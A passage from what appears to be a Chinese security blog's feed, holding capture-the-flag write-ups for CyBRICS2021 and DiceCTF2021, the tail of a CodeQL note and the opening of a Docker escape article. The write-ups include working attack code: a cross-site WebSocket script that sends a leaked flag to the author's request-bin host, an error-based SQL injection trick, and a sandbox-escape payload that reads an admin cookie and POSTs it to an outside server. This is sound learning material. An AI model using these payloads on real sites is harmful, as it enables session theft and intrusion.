      <span class="token comment" spellcheck="true">// which must be present in the source code</span>
      isValidMethod<span class="token punctuation">.</span><span class="token function">fromSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
      <span class="token comment" spellcheck="true">// and must be used to validate user-controlled data</span>
      <span class="token function">validatesUserControlledBeanProperty</span><span class="token punctuation">(</span>isValidMethod<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>简单魔改了一下，然后这里最后调用validatesUserControlledBeanProperty时还是使用了这个下划线参数，感觉，学到了一个全新的技巧。函数用来定位某个东西的时候可以多声明几个辅助变量，然后最后到调用的时候用下划线参数直接不管就行</p>
<p>这个函数倒是很好看懂了，就是寻找到一个有用户输入的isValid方法，然后这个类表示有用户输入的isValid方法的第一个参数</p>
<p>可以用这个类替代我们一开始的isSource中写的那些判断条件，把原来只是简单的找isValid的第一个参数，变成了有用户输入的isValid的第一个参数。。。。（我还以为是从输入点到触发点，这样子我还是没有特别懂输入点在哪。不过可以quick eval validatesUserControlledBeanProperty这个函数，它的validatedField应该就是用户输入处</p>
<p>我不管我不管搞完了，不坐牢了</p>
<p><strong>个人意见，这个东西写java是真折磨，首先需要完成源代码的编译，这就已经能砍掉一堆项目了，然后还由于java的各种特性各种继承各种注解，得考虑一万个东西，或者说我感觉这个是在已经有一定的漏洞思路之后去寻找的。像这个项目后期的用户输入到sink，注解那段我完全就没能理解，简单看了下代码才知道怎么回事。对于我来说这个过程更像是一个已知漏洞存在然后去验证的过程，而不是一个从零开始挖掘的过程</strong></p>
<p>以及感觉没有这种奇怪的挖掘需求。。。最近的需求都是找java gadget之类的东西，只是寻找一个存在特定方法特定属性的类之类的，而不是一个完整的过程。这把就当做了几天牢简单的尝试了一下新科技吧。。。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CyBRICS2021 wp</title>
    <url>/CyBRICS2021.html</url>
    <content><![CDATA[<h1 id="CyBRICS2021-wp"><a href="#CyBRICS2021-wp" class="headerlink" title="CyBRICS2021 wp"></a>CyBRICS2021 wp</h1><p>除了那个没太看懂怎么回事的0解题，剩下的题目都挺简单的，很适合我这种萌新去做</p>
<h2 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h2><p>就是简单的跟随重定向就行了，跟1337次后得到flag但是他的服务器似乎有点土豆，所以直接写个脚本然后访问的话基本上重定向个一二十次就断了，浏览器访问当然是直接重定向过多，所以不跟重定向然后自己每次重新访问重定向的内容就行</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://adnetwork-cybrics2021.ctf.su/adnetwork"</span>
cnt <span class="token operator">=</span> <span class="token number">0</span>


<span class="token keyword">while</span> cnt <span class="token operator">&lt;=</span> <span class="token number">1337</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        cnt <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            url <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

ans <span class="token operator">=</span> <span class="token string">"http://tend.adnetwork-cybrics2021.ctf.su/military-front-low/learn-fill-though-factor-line/hear-hundred-subject-wind/enough-lot-tree-will-color"</span>
</code></pre>
<p>我的队友却极其玄幻的有一个人一次都没timeout直接访问到底通了。。。是我太弱了吗</p>
<h2 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h2><p>这个题也挺简单的，整个就一个功能点，让你填一个邮箱，然后填的邮箱会回显在页面上但不知道为什么我第一反应不是ssti而是SQL注入，抓包看了一眼，除了提交的邮箱外还有一个sign，邮箱的格式是前端校验的，所以没有用，翻了一下页面上的js，找到了sign的内容就是提交的邮箱的md5。加个引号试一下之后直接报错<br>是insert语句，但是无过滤，直接按报错注入extractvalue打就行了，随便打</p>
<p>这里由于我是SQL注入垃圾，忘了extractvalue的用法，<code>extractvalue(1,concat(&#39;~&#39;,(查询语句)))</code>，一定要用concat拼一个废字符上去，这样子才能保证解析错误进行报错，之前忘了要拼这个垃圾，注了半天一直显示结果是空，给我打懵了。。。</p>
<h2 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h2><p>这个题也不难，不过有一点点意思。<br>功能点就两个，一个是加入聊天室，输入一个id然后连进去，另一个是向技术人员举报，技术人员（bot）就会访问你的链接，bot和admin在同一聊天室内，如果bot给admin发一句”Hey, i forgot the flag. Can you remind me?”，admin就会给bot回flag<br>听起来就是一个csrf，不过我们总是需要考虑跨域的情况，跨域csrf之后能拿到回显吗？同源策略总是无敌的</p>
<p>简单测试了一下发现，点击加入聊天室后会向ws路由发一个请求，cookie的值就是房间号，然后我们就会和远端建立一个websocket连接，确实这很合理，聊天室这种事情的实现就是websocket比较好。<br>那么攻击思路就应该是让bot去建立一个websocket，然后往websocket里面去写上述消息，admin就会回我们flag了<br>暂时没有了解过websocket的服务端实现，但是这里应该是根据cookie的room值来管理的，所以应该是csrf bot，让他直接带上他的cookie发起一个websocket连接，然后往连接里面写东西就行了，直接看题目的代码或者翻翻MDN就能简单的了解到websocket client怎么写，再本地调试一下就通了</p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token keyword">let</span> conn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">"ws://multichat-cybrics2021.ctf.su/ws"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    conn<span class="token punctuation">.</span>onclose <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>evt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>evt<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token number">1003</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Status: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>evt<span class="token punctuation">.</span>reason<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Connection closed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    conn<span class="token punctuation">.</span>onopen <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>evt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Connected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hey, i forgot the flag. Can you remind me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"send"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    conn<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>evt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>evt<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://requestbin.z3ratu1.cn/?"</span><span class="token operator">+</span>evt<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    conn<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>evt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>evt<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre>
<p>成功收到flag</p>
<p>这里其实有一个点我比较疑惑，就是我是用websocket的协议去进行连接的，不知道这个协议受不受samesite的影响，抓包的时候发现发起websocket连接的时候是发出去的一个GET请求，不过理论上来说，这种没有进行顶级导航跳转的GET请求应该算是cross-site的？又想起了samesite的定义，普通的samesite只需要顶级有效域名+1相同即可认为是samesite，不考虑协议和端口，那这里协议切换成了ws并不影响其他的判断，就从域名上看是显然跨域了的。并且后来还翻到一篇文章提到schemeful samesite，认为协议不同即为cross site，不过http-&gt;ws，https-&gt;wss不算cross site。不过就这题而言无论怎么说都是跨域了的<br>上网暴查一通，得到一个结论，<strong>websocket在建立连接时需要使用HTTP协议</strong></p>
<p>那这就更合理了，websocket在建立连接的时候是发送了一个带有指明这是一个websocket连接请求的请求头的HTTP请求，这个HTTP请求是以GET形式发出去的，通过burp抓包可以看见，然后服务端回一个101状态码表示变更协议，然后双方就建立起websocket连接了</p>
<p>那么这种GET请求应该是cross-site的，那么理论上不会携带cookie，本地Chrome复现也是如此，但是用Firefox却能抓到携带cookie的包，成功打通。<br>真玄幻啊，虽说websocket的连接请求和其他请求并不是很一致，但是在表现上还是一个GET请求啊？为什么你能发跨域cookie出去？</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>早上起来专门下了个Firefox试了一下，好像Firefox在samesite为空时的默认值是none，随便整个img链接都能把cookie发出去。。。而Chrome默认是lax的，所以不会发cookie，那么出题人后端bot应该是用的Firefox的浏览器咯？不过百度的结果其实都是说Chrome和Firefox在20年就已经把samesite的默认值为lax了，而我昨天刚下的Firefox还是none。。。。。不科学</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>DiceCTF2021</title>
    <url>/DiceCTF2021.html</url>
    <content><![CDATA[<h1 id="DiceCTF2021"><a href="#DiceCTF2021" class="headerlink" title="DiceCTF2021"></a>DiceCTF2021</h1><p>好像比justCTF简单不少。。。起码有萌新能做出来的题了呜呜<br>但是怎么感觉外国比赛这么喜欢XSS</p>
<h2 id="BabierCSP"><a href="#BabierCSP" class="headerlink" title="BabierCSP"></a>BabierCSP</h2><p>对标justCTF的BabyCSP，确实更baby了，justCTF那个题完全不会。。。<br>因为设置了default-src，fetch这些函数的请求的源也受到CSP控制，fetch就发不出去，一开始在这卡了<br>然后用windows.location.href跳转就行了</p>
<p>这个题nonce是不变的，那不就是无过滤XSS吗。一开始以为是题写歪了想考参考链接里面先知那个吞下面nonce的点的，后来测了一下发现这个必须是可控点和有nonce的script连在一起才行，不然之间的任意一个右尖括号都能把你给闭合了而无法吞下正确的nonce</p>
<p>现在想起来如果nonce会变就完全不会做了呜呜</p>
<h2 id="Missing-Flavortext"><a href="#Missing-Flavortext" class="headerlink" title="Missing Flavortext"></a>Missing Flavortext</h2><p>源码很短，就是个SQL注入题，只使用<code>if ([req.body.username, req.body.password].some(v =&gt; v.includes(&#39;\&#39;&#39;)))</code>过滤了单引号，查询语句为</p>
<pre class=" language-sqlite"><code class="language-sqlite">  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;
</code></pre>
<p>sqlite有着诡异的特性，不吃反斜杠转义，得用两个单引号来转义单引号，这里过滤了引号理论上无解了，但是这里使用的是<code>app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</code>，扩展确认为true，所以对username[1]&#x3D;123解析出来的结果就不是简单地username&#x3D;123的键值对，而是一个名为user的数组其中第二个值为123(第一个值下标为0是undefined)<br>这样子就能过之前那个some函数的check，而在填入req.body.password时填的却不是数组而是这个值，这大概就是js的奇妙特性吧</p>
<h2 id="Web-Unit"><a href="#Web-Unit" class="headerlink" title="Web Unit"></a>Web Unit</h2><p>一个创建链接功能和一个创建粘贴，使用创建链接时会检查是否使用的是http(s)协议，均生成一个uid，并将数据和对应的类型(link or paste)插入数据库，返回一个对应的uid，view路由接受一个uid，根据uid查询数据库，如果返回的数据type是link就根据链接重定向，如果type非link就用textContent拼到div里去<br><strong>textContent是超级防御，里面的数据都会被当做文本解析，绝对XSS不了</strong></p>
<p>注意到一个不认识的东西。。。百度了一下然后就出了，真实运气好</p>
<pre class=" language-javascript"><code class="language-javascript">函数原型为
<span class="token function">addData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>uid<span class="token punctuation">,</span>data<span class="token punctuation">,</span>type<span class="token punctuation">}</span><span class="token punctuation">)</span>
调用形式为
database<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token punctuation">{</span> type<span class="token punctuation">:</span> <span class="token string">'paste'</span><span class="token punctuation">,</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> uid <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="三点运算符"><a href="#三点运算符" class="headerlink" title="三点运算符"></a>三点运算符</h3><p>ES6语法，就是把一个数组拆成一个个的作为参数，或者把一个大括号(对象)对应的键值对解析出来当参数填入，也可以直接把只有一个元素的数组直接靠三点运算符当参数传入</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这里是用三点运算符把req.body解析出来填入参数，addData这个函数原型本来就有点玄幻，参数写成了一个对象，里面三个属性，然后调用的时候type先指定，再解析req.body，再传入uid。<br>本地测试了一下这个参数传递的情况，先是从左往右按顺序解析，所以<code>...req.body</code>是可以覆盖之前的type的，在没有检测的createPaste路由里面放一个javascript伪协议，并且req.body里多传一个type进去，覆盖type为link，这样子view查出来的数据就是链接，通过js伪协议打通</p>
<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>一开始想用fetch，因为这次没得CSP了嘛，然后报错Mixed Content，https不给加载http的内容，那我也配了https，反手换成https，发现监听端口得到的东西就不是人看的了。。。。最后还是换回location.href</p>
<p>后来想本地测试一下，结果burp还是不能抓本地包，没深究为什么，最后查到一个临时方案，ipconfig看一下自己内网地址，通过内网访问就能抓包了<br>再后来发现自己有点傻逼，参数解析为什么一定要用req.body呢，然后开始直接调试<br>发现传入参数为一个对象时，参数的变量名一定要和对象属性名对应，不能单纯的按顺序传入三个名字不对的变量，会导致对应属性undefined。。。。<br>题目写的是<code>database.addData(&#123; type: &#39;paste&#39;, ...req.body, uid &#125;);</code>，所以仅type可控，就算修改了uid也会被再覆盖回来，本地测试的时候把uid改成了uidd之后，如果req.body里面不提交uid，uid就变成undefined了</p>
<h2 id="Web-IDE"><a href="#Web-IDE" class="headerlink" title="Web IDE"></a>Web IDE</h2><p>提供了一个js在线运行环境，js运行那段代码看不太懂。。。只有管理员能存代码和看代码<br>admin cookie的samesite属性设置为none，感觉有点像CSRF的操作点，加上存和看两个功能只能admin搞，感觉就是CSRF，然后准备在自己vps上写个钓鱼，用fetch发一个POST请求，并把得到的代码存储路径转发出来，吃到了无敌的CORS限制，gg了。虽然还能用POST表单打CSRF，但是获取不到返回的js路径，让admin看代码的功能就无从说起</p>
<h3 id="看WP"><a href="#看WP" class="headerlink" title="看WP"></a>看WP</h3><p>整体来说这个题挺难的，只能对着慢慢理解一遍了</p>
<h4 id="safeEval沙盒绕过"><a href="#safeEval沙盒绕过" class="headerlink" title="safeEval沙盒绕过"></a>safeEval沙盒绕过</h4><p>刚开始做这个题的时候就没太看懂这段命令执行代码。。。现在学了一下一句一句理解</p>
<pre class=" language-javascript"><code class="language-javascript">  <span class="token keyword">const</span> safeEval <span class="token operator">=</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">with</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token string">'console'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>log<span class="token punctuation">}</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token string">'eval'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> window<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>
          <span class="token keyword">return</span> undefined<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>safeEval其实整个就是对一个匿名函数调用call(Object.create(null), d)，对匿名函数调用call实际上就是调用这个函数并传入参数，接下来看这个函数<br>比较迷惑的就是这段with Proxy，with关键字指定了一个上下文，在这个上下文中对所有属性的访问都会先去查找一下with指定的对象，查不到再去查外层，例子如下</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>c<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token keyword">with</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//等价于a.c 即为1</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Proxy为代理（好像java里面也有这种东西，但是都没学过），指定一个对象的代理，定义代理后可以使用一些trap函数，对被代理的对象进行一系列操作的时候，就可以hook对应的操作进行处理<br>这里创建了对window对象的代理，所以当eval中使用和window相关的属性的时候，就会收到get函数的限制，这里只允许获取到eval和log，log是重写的一个让内容能显示在界面上的函数</p>
<p>总而言之，safeEval的作用就是限制了这个eval在执行的时候window对象只有eval和log两个属性</p>
<p>看到这么一段话</p>
<blockquote>
<p>From what I know, there are couple of ways to execute arbitrary js:<br>window.eval<br>window.location + javascript pseudo protocol(javascript:)<br>window.setTimeout and window.setInterval<br>function constructor</p>
</blockquote>
<p>前三个都属于window对象的属性，都已经没得了，eval嵌套eval我估计不行，所以使用function constructor来绕过这个Proxy进行任意代码执行<br><code>[].constructor.constructor(code)()</code>，这里获取到函数的构造函数，构造出一个函数并进行自调用<br>这里在经历了一个Function.constructor之后似乎创建了一个独立的上下文，不再受到之前with上下文的影响，进而脱离了限制达到任意代码执行<br>浏览器控制台实验结果</p>
<pre class=" language-javascript"><code class="language-javascript">a<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>
<span class="token keyword">with</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"console.log(b)"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
VM145<span class="token punctuation">:</span><span class="token number">4</span> <span class="token number">1</span>
VM146<span class="token punctuation">:</span><span class="token number">3</span> Uncaught ReferenceError<span class="token punctuation">:</span> b is not defined
    at eval <span class="token punctuation">(</span>eval at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">)</span>
    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">49</span>
</code></pre>
<p>不过直接在题目上用这个方法是不能执行命令的，因为HTML里设置了这么一句<code>&lt;iframe src=&quot;../sandbox.html&quot; frameborder=&quot;0&quot; sandbox=&quot;allow-scripts&quot;&gt;&lt;/iframe&gt;</code>，只允许脚本执行，虽然看起来允许脚本执行已经为所欲为了，但事实上还有一大堆参数指定跨域表单提交创建窗口之类的，这个情况下alert弹窗都弹不出来</p>
<h3 id="postMessage提交数据"><a href="#postMessage提交数据" class="headerlink" title="postMessage提交数据"></a>postMessage提交数据</h3><p>但是这里可以看到在sandbox.html中，开了一个iframe为sandbox执行代码，而数据通过postMessage进行传递，因此可以在自己的vps上搭一个页面，引用题目的sandbox.html开一个iframe，这个iframe的sandbox属性就可以允许为所欲为，并自己写一个postMessage提交数据，这样子虽然这个页面是我个人的，但是操作是在题目环境下的iframe完成的，就没有之前CORS跨域的问题，整一个fetch(‘&#x2F;ide&#x2F;save’)并提交XSS脚本，拿到保存的的id，进行下一步攻击</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这个好理解一点。预期还用了service worker，太难了。。。<br>因为admin cookie设置情况如下</p>
<pre class=" language-javascript"><code class="language-javascript">      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`dice{</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">}`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        path<span class="token punctuation">:</span> <span class="token string">'/ide'</span><span class="token punctuation">,</span>
        sameSite<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
        secure<span class="token punctuation">:</span> <span class="token boolean">true</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/ide/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>samesite定义为none了，但是path指定在了ide下，sandbox.html处是没有这个cookie的，因此需要重新想办法获取到cookie，非预期是因为bot使用的是headless Chrome，可以跨路径获取cookie，对于普通的Chrome是不能这么打的<del>虽然我在自己的Chrome上试了一下也成功了。。。</del></p>
<p>开一个window之后直接获取到window.document.cookie发出来<br>抄的payload</p>
<pre class=" language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://web-ide.dicec.tf/sandbox.html<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token keyword">const</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    frame<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`(async () => {
      const w = eval.call(this, "window");
      let p = w.open('/ide');
      await new w.Promise(r => w.setTimeout(r, 500));
      const c = p.document.cookie;
      w.fetch("ctf.rabulinski.com", { method: "POST", body: c });
    })();`</span></span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>通过注册service worker并addEventListener fetch，控制页面所加载的资源，由于sw只能注册本地文件，因此需先让admin存一个sw脚本并获取到结果<br>由于service worker并不在页面上下文中运行，即注册了sw也无法直接获取cookie，但由于sw可以控制加载的资源，因此只需让在ide路径下加载的资源变为指定的恶意脚本即可在ide路径下将cookie发送出来</p>
<p>具体payload看下面链接吧。。。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7372#toc-9">CSP绕过姿势</a><br><a href="https://github.com/aszx87410/ctf-writeups/issues/19">Web IDE wp</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call#%E4%BD%BF%E7%94%A8_call_%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0">call MDN</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">iframe MDN</a><br><a href="https://github.com/gr455/ctf-writeups/blob/master/dicectf21/web_ide.md">web_ide.md</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>XSS</tag>
        <tag>Service worker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker escape</title>
    <url>/Docker%20Escape.html</url>
    <content><![CDATA[<h1 id="Docker-escape"><a href="#Docker-escape" class="headerlink" title="Docker escape"></a>Docker escape</h1><blockquote>
<p>Docker逃逸的本质和硬件虚拟化逃逸的本质有很大的不同，容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受Cgroup&#x2F;Namespace限制权限的进程获取更多权限的操作，更趋近于提权。</p>
</blockquote>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在开始之前，先看看docker和docker实现相关的技术基础</p>
<h3 id="Linux-namespace"><a href="#Linux-namespace" class="headerlink" title="Linux namespace"></a>Linux namespace</h3><p>Linux命名空间，操作系统内核级别的资源隔离方案。通过命名空间，每个进程只能访问自己所处命名空间的资源，因此每个容器才被做到似乎被隔离的效果。<br>唯有特权用户可以创建命名空间，用户命名空间是一个例外，在Linux3.8后，创建一个<code>user namespace</code>不再需要特权<br>Linux提供了七类资源的隔离机制，分别是：</p>
<ul>
<li><code>Mount</code>: 隔离文件系统挂载点</li>
<li><code>UTS</code>: 隔离主机名和域名信息</li>
<li><code>IPC</code>: 隔离进程间通信</li>
<li><code>PID</code>: 隔离进程的ID</li>
<li><code>Network</code>: 隔离网络资源</li>
<li><code>User</code>: 隔离用户和用户组的ID</li>
<li><code>Cgroup</code>:隔离Cgroup根目录（？干什么的，有的资料上没写有这个功能，不过manpage上可以看到确实新加了这个）</li>
</ul>
